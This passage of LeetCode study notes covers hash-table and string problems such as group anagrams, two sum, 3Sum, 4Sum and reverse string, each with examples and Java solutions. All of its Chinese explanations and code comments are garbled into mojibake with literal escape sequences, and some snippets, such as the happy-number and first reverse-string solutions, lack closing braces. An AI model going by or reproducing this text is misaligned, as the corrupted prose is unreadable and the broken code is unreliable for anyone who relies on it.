æ˜¯ç”±é‡æ–°æ’åˆ—æºå•è¯çš„å­—æ¯å¾—åˆ°çš„ä¸€ä¸ªæ–°å•è¯ï¼Œæ‰€æœ‰æºå•è¯ä¸­çš„å­—æ¯é€šå¸¸æ°å¥½åªç”¨ä¸€æ¬¡ã€‚\n\n**ç¤ºä¾‹ 1:**\n\n```\nè¾“å…¥: strs = [\"eat\", \"tea\", \"tan\", \"ate\", \"nat\", \"bat\"]\nè¾“å‡º: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n```\n\n**ç¤ºä¾‹ 2:**\n\n```\nè¾“å…¥: strs = [\"\"]\nè¾“å‡º: [[\"\"]]\n```\n\n**ç¤ºä¾‹ 3:**\n\n```\nè¾“å…¥: strs = [\"a\"]\nè¾“å‡º: [[\"a\"]]\n```\n\n------\n\n**æ–¹æ³•1ï¼šæ’åº**\n\néå†å­—ç¬¦ä¸²æ•°ç»„ï¼Œå¯¹æ¯ä¸ªå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ’åºï¼ŒåŠ å…¥mapå¯¹åº”çš„keyçš„æ•°ç»„ä¸­ã€‚\n\n```java\nclass Solution {\n    public List<List<String>> groupAnagrams(String[] strs) {\n        Map<String,List<String>> map = new HashMap<>();\n        for(String str : strs){\n            char[] arr = str.toCharArray();\n            Arrays.sort(arr);\n            String key = new String(arr);\n            List<String> list = map.getOrDefault(key, new ArrayList<String>());\n            list.add(str);\n            map.put(key, list);\n        }\n        return new ArrayList<List<String>>(map.values());\n    }\n}\n```\n\n**æ–¹æ³•2ï¼šè®¡æ•°**\nç”±äºäº’ä¸ºå­—æ¯å¼‚ä½è¯çš„ä¸¤ä¸ªå­—ç¬¦ä¸²åŒ…å«çš„å­—æ¯ç›¸åŒï¼Œå› æ­¤ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç›¸åŒå­—æ¯å‡ºç°çš„æ¬¡æ•°ä¸€å®šæ˜¯ç›¸åŒçš„ï¼Œæ•…å¯ä»¥å°†æ¯ä¸ªå­—æ¯å‡ºç°çš„æ¬¡æ•°ä½¿ç”¨å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œä½œä¸ºå“ˆå¸Œè¡¨çš„é”®ã€‚\n\nç”±äºå­—ç¬¦ä¸²åªåŒ…å«å°å†™å­—æ¯ï¼Œå› æ­¤å¯¹äºæ¯ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨é•¿åº¦ä¸º 26 çš„æ•°ç»„è®°å½•æ¯ä¸ªå­—æ¯å‡ºç°çš„æ¬¡æ•°ã€‚\n\n```java\nclass Solution {\n    public List<List<String>> groupAnagrams(String[] strs) {\n        Map<String, List<String>> map = new HashMap<String, List<String>>();\n        for (String str : strs) {\n            int[] counts = new int[26];\n            int length = str.length();\n            for (int i = 0; i < length; i++) {\n                counts[str.charAt(i) - 'a']++;\n            }\n            // å°†æ¯ä¸ªå‡ºç°æ¬¡æ•°å¤§äº 0 çš„å­—æ¯å’Œå‡ºç°æ¬¡æ•°æŒ‰é¡ºåºæ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œä½œä¸ºå“ˆå¸Œè¡¨çš„é”®\n            StringBuffer sb = new StringBuffer();\n            for (int i = 0; i < 26; i++) {\n                if (counts[i] != 0) {\n                    sb.append((char) ('a' + i));\n                    sb.append(counts[i]);\n                }\n            }\n            String key = sb.toString();\n            List<String> list = map.getOrDefault(key, new ArrayList<String>());\n            list.add(str);\n            map.put(key, list);\n        }\n        return new ArrayList<List<String>>(map.values());\n    }\n}\n```\n\n#### [349. ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†](https://leetcode.cn/problems/intersection-of-two-arrays/)\n\nç»™å®šä¸¤ä¸ªæ•°ç»„ `nums1` å’Œ `nums2` ï¼Œè¿”å›å®ƒä»¬çš„äº¤é›† ã€‚è¾“å‡ºç»“æœä¸­çš„æ¯ä¸ªå…ƒç´ ä¸€å®šæ˜¯ **å”¯ä¸€** çš„ã€‚æˆ‘ä»¬å¯ä»¥ **ä¸è€ƒè™‘è¾“å‡ºç»“æœçš„é¡ºåº** ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šnums1 = [1,2,2,1], nums2 = [2,2]\nè¾“å‡ºï¼š[2]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šnums1 = [4,9,5], nums2 = [9,4,9,8,4]\nè¾“å‡ºï¼š[9,4]\nè§£é‡Šï¼š[4,9] ä¹Ÿæ˜¯å¯é€šè¿‡çš„\n```\n\n------\n\n```java\nclass Solution {\n    public int[] intersection(int[] nums1, int[] nums2) {\n      \n        Set<Integer> set1 = new HashSet<>();\n        Set<Integer> set2 = new HashSet<>();\n        //å¯¹nums1å»é‡å¹¶å­˜å…¥set1\n        for(int i = 0; i < nums1.length; i++){\n            set1.add(nums1[i]);\n        }\n        //nums2ä¸setå¯¹æ¯”ï¼Œç›¸åŒå…ƒç´ å­˜å…¥set2\n        for(int num : nums2){\n            if(set1.contains(num)){\n                set2.add(num);\n            }\n        }\n        //å°†set2è½¬åŒ–ä¸ºæ•°ç»„\n        int[] res = new int[set2.size()];\n        int index = 0;\n        for(int num : set2){\n            res[index++] = num;\n        }\n        //æ–¹æ³•2:å°†set2è½¬åŒ–ä¸ºæ•°ç»„\n        //int[] res = set2.stream().mapToInt(Integer::valueOf).toArray();\n        return res;\n    }\n}\n```\n\n#### [202. å¿«ä¹æ•°](https://leetcode.cn/problems/happy-number/)\n\nç¼–å†™ä¸€ä¸ªç®—æ³•æ¥åˆ¤æ–­ä¸€ä¸ªæ•° `n` æ˜¯ä¸æ˜¯å¿«ä¹æ•°ã€‚\n\n**ã€Œå¿«ä¹æ•°ã€** å®šä¹‰ä¸ºï¼š\n\n-   å¯¹äºä¸€ä¸ªæ­£æ•´æ•°ï¼Œæ¯ä¸€æ¬¡å°†è¯¥æ•°æ›¿æ¢ä¸ºå®ƒæ¯ä¸ªä½ç½®ä¸Šçš„æ•°å­—çš„å¹³æ–¹å’Œã€‚\n-   ç„¶åé‡å¤è¿™ä¸ªè¿‡ç¨‹ç›´åˆ°è¿™ä¸ªæ•°å˜ä¸º 1ï¼Œä¹Ÿå¯èƒ½æ˜¯ **æ— é™å¾ªç¯** ä½†å§‹ç»ˆå˜ä¸åˆ° 1ã€‚\n-   å¦‚æœè¿™ä¸ªè¿‡ç¨‹ **ç»“æœä¸º** 1ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±æ˜¯å¿«ä¹æ•°ã€‚\n\nå¦‚æœ `n` æ˜¯ å¿«ä¹æ•° å°±è¿”å› `true` ï¼›ä¸æ˜¯ï¼Œåˆ™è¿”å› `false` ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šn = 19\nè¾“å‡ºï¼štrue\nè§£é‡Šï¼š\n1^2 + 9^2 = 82\n8^2 + 2^2 = 68\n6^2 + 8^2 = 100\n1^2 + 0^2 + 0^2 = 1\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šn = 2\nè¾“å‡ºï¼šfalse\n```\n\n------\n\n1. ç»™ä¸€ä¸ªæ•°å­— nï¼Œå¾ªç¯è®¡ç®—ä¸‹ä¸€ä¸ªæ•°å­—ï¼Œç›´åˆ°ç­‰äº1\n2. ä½¿ç”¨Setåˆ¤æ–­æˆ‘ä»¬æ˜¯å¦è¿›å…¥äº†ä¸€ä¸ªå¾ªç¯ã€‚\n\n```java\nclass Solution {\n    public boolean isHappy(int n) {\n        Set<Integer> set = new HashSet<>();\n        while(n != 1 && !set.contains(n)){\n            set.add(n);\n            n = getNextNum(n);\n        }\n        return n == 1;\n    }\n\n    public int getNextNum(int n) {\n        int nextNum = 0;\n        while(n > 0){\n            int temp = n % 10;\n            nextNum += temp * temp;\n            n = n / 10;\n        }\n        return nextNum;\n    }\n\n```\n\n#### [1. ä¸¤æ•°ä¹‹å’Œ](https://leetcode.cn/problems/two-sum/)\n\nç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ `target`ï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º **å’Œä¸ºç›®æ ‡å€¼** _`target`_  çš„é‚£ **ä¸¤ä¸ª** æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚\n\nä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚\n\nä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```\nè¾“å…¥ï¼šnums = [2,7,11,15], target = 9\nè¾“å‡ºï¼š[0,1]\nè§£é‡Šï¼šå› ä¸º nums[0] + nums[1] == 9 ï¼Œè¿”å› [0, 1] ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```\nè¾“å…¥ï¼šnums = [3,2,4], target = 6\nè¾“å‡ºï¼š[1,2]\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```\nè¾“å…¥ï¼šnums = [3,3], target = 6\nè¾“å‡ºï¼š[0,1]\n```\n\n------\n\n```java\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        HashMap<Integer,Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            if(map.containsKey(target - nums[i])){\n                return new int[]{map.get(target - nums[i]),i};\n            }\n            map.put(nums[i],i);\n        }\n        return new int[0];\n    }\n}\n```\n\n#### [454. å››æ•°ç›¸åŠ  II ](https://leetcode.cn/problems/4sum-ii/description/)\n\nç»™ä½ å››ä¸ªæ•´æ•°æ•°ç»„ `nums1`ã€`nums2`ã€`nums3` å’Œ `nums4` ï¼Œæ•°ç»„é•¿åº¦éƒ½æ˜¯ `n` ï¼Œè¯·ä½ è®¡ç®—æœ‰å¤šå°‘ä¸ªå…ƒç»„ `(i, j, k, l)` èƒ½æ»¡è¶³ï¼š\n\n-   `0 <= i, j, k, l < n`\n-   `nums1[i] + nums2[j] + nums3[k] + nums4[l] == 0`\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums1 = [1,2], nums2 = [-2,-1], nums3 = [-1,2], nums4 = [0,2]\nè¾“å‡ºï¼š2\nè§£é‡Šï¼š\nä¸¤ä¸ªå…ƒç»„å¦‚ä¸‹ï¼š\n1. (0, 0, 0, 1) -> nums1[0] + nums2[0] + nums3[0] + nums4[1] = 1 + (-2) + (-1) + 2 = 0\n2. (1, 1, 0, 0) -> nums1[1] + nums2[1] + nums3[0] + nums4[0] = 2 + (-1) + (-1) + 0 = 0\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums1 = [0], nums2 = [0], nums3 = [0], nums4 = [0]\nè¾“å‡ºï¼š1\n```\n\nè¯¥é¢˜ç­‰ä»·äº è®¡ç®— a + b + c + d = 0\n\n1. é¦–å…ˆå®šä¹‰ mapï¼Œkeyæ”¾aå’Œbä¸¤æ•°ä¹‹å’Œï¼Œvalue æ”¾aå’Œbä¸¤æ•°ä¹‹å’Œå‡ºç°çš„æ¬¡æ•°ã€‚\n2. éå†æ•°ç»„1å’Œ2ï¼Œç»Ÿè®¡ä¸¤ä¸ªæ•°ç»„å…ƒç´ ä¹‹å’Œï¼Œå’Œå‡ºç°çš„æ¬¡æ•°ï¼Œæ”¾åˆ°mapä¸­ã€‚\n3. å®šä¹‰intå˜é‡resï¼Œç”¨æ¥ç»Ÿè®¡ a+b+c+d = 0 å‡ºç°çš„æ¬¡æ•°ã€‚\n4. å†éå†æ•°ç»„3å’Œ4ï¼Œæ‰¾åˆ°å¦‚æœ 0-(c+d) åœ¨mapä¸­å‡ºç°è¿‡çš„è¯ï¼Œå°±æŠŠmapä¸­keyå¯¹åº”çš„valueç»Ÿè®¡å‡ºæ¥ã€‚\n5. æœ€åè¿”å›ç»Ÿè®¡å€¼ res å°±å¯ä»¥äº†\n\n```java\nclass Solution {\n    public int fourSumCount(int[] nums1, int[] nums2, int[] nums3, int[] nums4) {\n        Map<Integer, Integer> map = new HashMap<>();\n        //keyæ”¾ä¸¤æ•°ä¹‹å’Œï¼Œvalueæ”¾ä¸¤æ•°ä¹‹å’Œå‡ºç°çš„æ¬¡æ•°ã€‚\n        for(int i : nums1){\n            for(int j: nums2){\n                map.put(i + j, map.getOrDefault(i + j, 0) + 1);\n            }\n        }\n        int res = 0;\n        //å¦‚æœåœ¨mapä¸­å‡ºç°è¿‡çš„è¯ï¼Œå°±æŠŠmapä¸­keyå¯¹åº”çš„valueä¹Ÿå°±æ˜¯å‡ºç°æ¬¡æ•°ç»Ÿè®¡å‡ºæ¥ã€‚\n        for(int i : nums3){\n            for(int j: nums4){\n                if(map.containsKey(0 - (i + j))){\n                    res += map.get(0 - (i + j));\n                }\n            }\n        }\n        return res;\n    }\n}\n```\n\n#### [383. èµé‡‘ä¿¡](https://leetcode.cn/problems/ransom-note/)\n\nç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼š`ransomNote` å’Œ `magazine` ï¼Œåˆ¤æ–­ `ransomNote` èƒ½ä¸èƒ½ç”± `magazine` é‡Œé¢çš„å­—ç¬¦æ„æˆã€‚\n\nå¦‚æœå¯ä»¥ï¼Œè¿”å› `true` ï¼›å¦åˆ™è¿”å› `false` ã€‚\n\n`magazine` ä¸­çš„æ¯ä¸ªå­—ç¬¦åªèƒ½åœ¨ `ransomNote` ä¸­ä½¿ç”¨ä¸€æ¬¡ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šransomNote = \"a\", magazine = \"b\"\nè¾“å‡ºï¼šfalse\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šransomNote = \"aa\", magazine = \"ab\"\nè¾“å‡ºï¼šfalse\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šransomNote = \"aa\", magazine = \"aab\"\nè¾“å‡ºï¼štrue\n```\n\n------\n\n```java\n//mapå®ç°\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        Map<Character, Integer> map = new HashMap<>();\n        for(char ch : magazine.toCharArray()){\n            map.put(ch, map.getOrDefault(ch, 0) + 1);\n        }\n        for(char ch : ransomNote.toCharArray()){\n            map.put(ch, map.getOrDefault(ch, 0) - 1);\n        }\n        for(Integer value : map.values() ){\n            if(value < 0) return false;\n        }\n        return true;\n    }\n}\n//å“ˆå¸Œè¡¨å®ç°\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        int[] hashTable = new int[26];\n        for(char ch : magazine.toCharArray()){\n            hashTable[ch - 'a']++;\n        }\n        for(char ch : ransomNote.toCharArray()){\n            hashTable[ch - 'a']--;\n        }\n        for(int value : hashTable){\n            if(value < 0){\n                return false;\n            }\n        }\n        return true;\n    }\n}\n//ä¼˜åŒ–\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        int[] hashTable = new int[26];\n        for (char ch : magazine.toCharArray()) {\n            hashTable[ch - 'a']++;\n        }\n        // åˆäºŒä¸ºä¸€\n        for (char ch : ransomNote.toCharArray()) {\n            if (--hashTable[ch - 'a'] < 0)\n                return false;\n        }\n        return true;\n    }\n}\n```\n\n#### [15. ä¸‰æ•°ä¹‹å’Œ](https://leetcode.cn/problems/3sum/)\n\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ `nums` ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸‰å…ƒç»„ `[nums[i], nums[j], nums[k]]` æ»¡è¶³ `i != j`ã€`i != k` ä¸” `j != k` ï¼ŒåŒæ—¶è¿˜æ»¡è¶³ `nums[i] + nums[j] + nums[k] == 0` ã€‚è¯·ä½ è¿”å›æ‰€æœ‰å’Œä¸º `0` ä¸”ä¸é‡å¤çš„ä¸‰å…ƒç»„ã€‚\n\n**æ³¨æ„ï¼š**ç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„ä¸‰å…ƒç»„ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [-1,0,1,2,-1,-4]\nè¾“å‡ºï¼š[[-1,-1,2],[-1,0,1]]\nè§£é‡Šï¼š\nnums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 ã€‚\nnums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 ã€‚\nnums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 ã€‚\nä¸åŒçš„ä¸‰å…ƒç»„æ˜¯ [-1,0,1] å’Œ [-1,-1,2] ã€‚\næ³¨æ„ï¼Œè¾“å‡ºçš„é¡ºåºå’Œä¸‰å…ƒç»„çš„é¡ºåºå¹¶ä¸é‡è¦ã€‚\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [0,1,1]\nè¾“å‡ºï¼š[]\nè§£é‡Šï¼šå”¯ä¸€å¯èƒ½çš„ä¸‰å…ƒç»„å’Œä¸ä¸º 0 ã€‚\n```\n\n**ç¤ºä¾‹ 3ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [0,0,0]\nè¾“å‡ºï¼š[[0,0,0]]\nè§£é‡Šï¼šå”¯ä¸€å¯èƒ½çš„ä¸‰å…ƒç»„å’Œä¸º 0 ã€‚\n```\n\n------\n\n```java\n//ä¸‰é‡æš´åŠ›å¾ªç¯ï¼šè¶…å‡ºæ—¶é—´é™åˆ¶\nprivate List<List<Integer>> directlySolution(int[] nums) {\n    if (nums == null || nums.length <= 2) {\n        return Collections.emptyList();\n    }\n    Arrays.sort(nums);\n    Set<List<Integer>> result = new LinkedHashSet<>();\n    for (int i = 0; i < nums.length; i++) {\n        for (int j = i+1; j < nums.length; j++) {\n            for (int k = j+1; k < nums.length; k++) {\n                if (nums[i] + nums[j] + nums[k] == 0) {\n                    List<Integer> value = Arrays.asList(nums[i], nums[j], nums[k]);\n                    result.add(value);\n                }\n            }\n        }\n    }\n\n    return new ArrayList<>(result);\n}\n```\n\n```java\n//ä¸¤é‡æš´åŠ›+hash\nclass Solution {\n    public List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> result = new ArrayList<>();\n        Map<Integer, Integer> map = new HashMap<>();\n        //æŠŠæ‰€æœ‰æ•°ç»„å…ƒç´ è½½å…¥map\n        for(int i = 0; i < nums.length; i++){\n            map.put(nums[i], i);\n        }\n        for(int i = 0; i < nums.length; i++){\n            for(int j = i + 1; j < nums.length; j++){\n                int c = 0 - (nums[i] + nums[j]);\n                if(map.containsKey(c) && map.get(c) > j){\n                    List<Integer> list = new ArrayList<>();\n                    list.add(nums[i]);\n                    list.add(nums[j]);\n                    list.add(c);\n                    Collections.sort(list);//æ’åºï¼Œæ–¹ä¾¿å»é‡\n                    if(!result.contains(list)){\n                        result.add(list);\n                    }\n                }  \n            }\n        }\n        return result;\n    }\n}\n```\n\n```java\n//åŒæŒ‡é’ˆ\nclass Solution {\n    public static List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> ans = new ArrayList();\n        int len = nums.length;\n        if(nums == null || len < 3) return ans;\n        Arrays.sort(nums); // æ’åº\n        for (int i = 0; i < len ; i++) {\n            //å¦‚æœç¬¬ä¸€ä¸ªå°±å¤§äº0ï¼Œåˆ™ä¸‰æ•°ä¹‹å’Œä¸€å®šå¤§äº0ï¼Œç»“æŸå¾ªç¯\n            if(nums[i] > 0) break; \n            //å¦‚æœè¿ç»­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰å°±è·³è¿‡ç¬¬äºŒä¸ªï¼Œé¿å…é‡å¤\n            if(i > 0 && nums[i] == nums[i-1]) continue; // å»é‡\n            int L = i + 1;\n            int R = len - 1;\n            while(L < R){\n                int sum = nums[i] + nums[L] + nums[R];\n                if (sum < 0) L++;\n                else if (sum > 0) R--;\n                else if(sum == 0){\n                    ans.add(Arrays.asList(nums[i],nums[L],nums[R]));\n                    while (L < R && nums[L] == nums[L+1]) L++; // å»é‡\n                    while (L < R && nums[R] == nums[R-1]) R--; // å»é‡\n                    L++;\n                    R--;\n                }\n            }\n        }        \n        return ans;\n    }\n}\n```\n\n#### [18. å››æ•°ä¹‹å’Œ](https://leetcode.cn/problems/4sum/)\n\nç»™ä½ ä¸€ä¸ªç”± `n` ä¸ªæ•´æ•°ç»„æˆçš„æ•°ç»„ `nums` ï¼Œå’Œä¸€ä¸ªç›®æ ‡å€¼ `target` ã€‚è¯·ä½ æ‰¾å‡ºå¹¶è¿”å›æ»¡è¶³ä¸‹è¿°å…¨éƒ¨æ¡ä»¶ä¸”**ä¸é‡å¤**çš„å››å…ƒç»„ `[nums[a], nums[b], nums[c], nums[d]]` ï¼ˆè‹¥ä¸¤ä¸ªå››å…ƒç»„å…ƒç´ ä¸€ä¸€å¯¹åº”ï¼Œåˆ™è®¤ä¸ºä¸¤ä¸ªå››å…ƒç»„é‡å¤ï¼‰ï¼š\n\n-   `0 <= a, b, c, d < n`\n-   `a`ã€`b`ã€`c` å’Œ `d` **äº’ä¸ç›¸åŒ**\n-   `nums[a] + nums[b] + nums[c] + nums[d] == target`\n\nä½ å¯ä»¥æŒ‰ **ä»»æ„é¡ºåº** è¿”å›ç­”æ¡ˆ ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [1,0,-1,0,-2,2], target = 0\nè¾“å‡ºï¼š[[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šnums = [2,2,2,2,2], target = 8\nè¾“å‡ºï¼š[[2,2,2,2]]\n```\n\n------\n\n```java\nclass Solution {\n    public List<List<Integer>> fourSum(int[] nums, int target) {\n        List<List<Integer>> res = new ArrayList<>();\n        Arrays.sort(nums);\n        for(int i = 0; i < nums.length; i++){\n            if(nums[i] > 0 && nums[i] > target) break; //å»é‡\n            if(i > 0 && nums[i] == nums[i -1]) continue; //å»é‡\n            for(int j = i + 1; j < nums.length; j++){\n                if (j > i + 1 && nums[j - 1] == nums[j]) continue; //å»é‡\n                int L = j + 1, R = nums.length - 1;\n                while(L < R) {\n                    int sum = nums[i] + nums[j] + nums[L] + nums[R];\n                    if(sum > target) R--;\n                    else if(sum < target) L++;\n                    else {\n                        res.add(Arrays.asList(nums[i],nums[j],nums[L],nums[R]));\n                        while(L < R && nums[L] == nums[L + 1]) L++; //å»é‡\n                        while(L < R && nums[R] == nums[R - 1]) R--; //å»é‡\n                        L++; \n                        R--;\n                    }\n                }  \n            }\n        }\n        return res;\n    }\n}\n```\n\n## â‘¤å­—ç¬¦ä¸²\n\n### [344. åè½¬å­—ç¬¦ä¸²](https://leetcode.cn/problems/reverse-string/)\n\nç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œå…¶ä½œç”¨æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åè½¬è¿‡æ¥ã€‚è¾“å…¥å­—ç¬¦ä¸²ä»¥å­—ç¬¦æ•°ç»„ `s` çš„å½¢å¼ç»™å‡ºã€‚\n\nä¸è¦ç»™å¦å¤–çš„æ•°ç»„åˆ†é…é¢å¤–çš„ç©ºé—´ï¼Œä½ å¿…é¡»**åŸåœ°ä¿®æ”¹è¾“å…¥æ•°ç»„**ã€ä½¿ç”¨ O(1) çš„é¢å¤–ç©ºé—´è§£å†³è¿™ä¸€é—®é¢˜ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = [\"h\",\"e\",\"l\",\"l\",\"o\"]\nè¾“å‡ºï¼š[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = [\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\nè¾“å‡ºï¼š[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n------\n\n```java\nclass Solution {\n    public void reverseString(char[] s) {\n        int left = 0, right = s.length - 1;\n        while(left < right){\n            char tmp  = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n            left++;\n            right--;\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int n = s.length;\n        for (int left = 0, right = n - 1; left < right; ++left, --right) {\n            char tmp = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n        }\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int l = 0;\n        int r = s.length - 1;\n        while (l < r) {\n            s[l] ^= s[r];  //æ„é€  a ^ b çš„ç»“æœï¼Œå¹¶æ”¾åœ¨ a ä¸­\n            s[r] ^= s[l];  //å°† a ^ b è¿™ä¸€ç»“æœå† ^ b ï¼Œå­˜å…¥bä¸­ï¼Œæ­¤æ—¶ b = a, a = a ^ b\n            s[l] ^= s[r];  //a ^ b çš„ç»“æœå† ^ a ï¼Œå­˜å…¥ a ä¸­ï¼Œæ­¤æ—¶ b = a, a = b å®Œæˆäº¤æ¢\n            l++;\n            r--;\n        }\n    }\n}  \n```\n\n### [541. åè½¬å­—ç¬¦ä¸² II](https://leetcode.cn/problems/reverse-string-ii/)\n\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸² `s` å’Œä¸€ä¸ªæ•´æ•° `k`ï¼Œä»å­—ç¬¦ä¸²å¼€å¤´ç®—èµ·ï¼Œæ¯è®¡æ•°è‡³ `2k` ä¸ªå­—ç¬¦ï¼Œå°±åè½¬è¿™ `2k` å­—ç¬¦ä¸­çš„å‰ `k` ä¸ªå­—ç¬¦ã€‚\n\n-   å¦‚æœå‰©ä½™å­—ç¬¦å°‘äº `k` ä¸ªï¼Œåˆ™å°†å‰©ä½™å­—ç¬¦å…¨éƒ¨åè½¬ã€‚\n-   å¦‚æœå‰©ä½™å­—ç¬¦å°äº `2k` ä½†å¤§äºæˆ–ç­‰äº `k` ä¸ªï¼Œåˆ™åè½¬å‰ `k` ä¸ªå­—ç¬¦ï¼Œå…¶ä½™å­—ç¬¦ä¿æŒåŸæ ·ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"abcdefg\", k = 2\nè¾“å‡ºï¼š\"bacdfeg\"\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n```properties\nè¾“å…¥ï¼šs = \"abcd\", k = 2\nè¾“å‡ºï¼š\"bacd\"\n```\n\n------\n\né¢˜æ„ï¼šæ¯éš”2kä¸ªåè½¬å‰kä¸ªï¼Œå°¾æ•°ä¸å¤Ÿkä¸ªæ—¶å€™å…¨éƒ¨åè½¬\n\n```java\nclass Solution {\n    public String reverseStr(String s, int k) {\n        int n = s.length();\n        char[] arr = s.toCharArray();\n        // 1. æ¯éš” 2k ä¸ªå­—ç¬¦çš„å‰ k ä¸ªå­—ç¬¦è¿›è¡Œåè½¬\n        for (int i = 0; i< n; i += 2 * k) {\n            // 2. å‰©ä½™å­—ç¬¦å°äº 2k ä½†å¤§äºæˆ–ç­‰äº k ä¸ªï¼Œåˆ™åè½¬å‰ k ä¸ªå­—ç¬¦\n            if (i + k <= n) {\n                reverse(arr, i, i + k -1);\n                continue;\n            }\n            // 3. å‰©ä½™å­—ç¬¦å°‘äº k ä¸ªï¼Œåˆ™å°†å‰©ä½™å­—ç¬¦å…¨éƒ¨åè½¬\n            reverse(arr, i, n - 1);\n        }\n        return  new String(arr);\n    }\n    // å®šä¹‰ç¿»è½¬å‡½æ•°\n    public void reverse(char[] arr, int left, int right) {\n        while (left < right) {\n            char temp = arr[left];\n            arr[left] = arr[right];\n            arr[right] = temp;\n            left++;\n            right--;\n        }\n    }\n}\n\n\n\nclass Solution {\n    public String reverseStr(String s, int k) {\n        int n = s.length();\n        char[] arr = s.toCharArray();\n      \n        for (int i = 0; i < n; i += 2 * k) {\n             // 1. æ¯éš” 2k ä¸ªå­—ç¬¦çš„å‰ k ä¸ªå­—ç¬¦è¿›è¡Œåè½¬\n            // 2. å‰©ä½™å­—ç¬¦å°äº 2k ä½†å¤§äºæˆ–ç­‰äº k ä¸ªï¼Œåˆ™åè½¬å‰ k ä¸ªå­—ç¬¦\n            reverse(arr, i, Math.min(i + k, n) - 1);\n        }\n        return String.valueOf(arr);\n    }\n\n    public void reverse(char[] arr, int left, int right) {\n        while (left < right) {\n            char temp = arr[left];\n            arr[left] = arr[right];\n            arr[right] = temp;\n            left++;\n            right--;\n        }\n    }\n}\n```\n\n### [å‰‘æŒ‡ Offer 05. æ›¿æ¢ç©ºæ ¼](https://leetcode.cn/problems/ti-huan-kong-ge-lcof/)\n\nè¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸² `s` ä¸­çš„æ¯ä¸ªç©ºæ ¼æ›¿æ¢æˆ\"%20\"ã€‚\n\n```properties\nè¾“å…¥ï¼šs = \"We are happy.\"\nè¾“å‡ºï¼š\"We%20are%20happy.\"\n```\n\n```java\nclass Solution {\n    public String replaceSpace(String s) {\n        StringBuilder sb = new StringBuilder();\n        for(int i = 0; i < s.length(); i++){\n            